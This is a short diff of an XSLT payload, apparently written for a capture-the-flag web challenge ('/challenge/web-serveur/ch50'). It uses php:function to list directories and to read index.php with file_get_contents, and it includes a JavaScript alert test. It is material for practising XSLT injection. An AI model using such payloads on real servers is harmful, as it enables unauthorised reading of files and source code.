@@ -7,13 +7,13 @@ xmlns:php="http://php.net/xsl"
 <xsl:param  name="strscand"   select="php:function('implode',$shandle,'')" disable-output-escaping="yes"/> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/>
 <script type="text/javascript" >
-alert(1);
+alert(2);
 </script>
  
 <div style="background-color:teal;color:white;padding:4px">
 <span style="font-weight:bold">
  DIR2 implode:<xsl:value-of select="$strscand"/>     
- DIR2 scan:<xsl:value-of select="$shandle"/>       
+ DIR2 scan:<xsl:copy-of select="$shandle"/>       
  DIR1 index.php:<xsl:value-of select="$header"/>   
 <xsl:value-of select="name"/>
 -
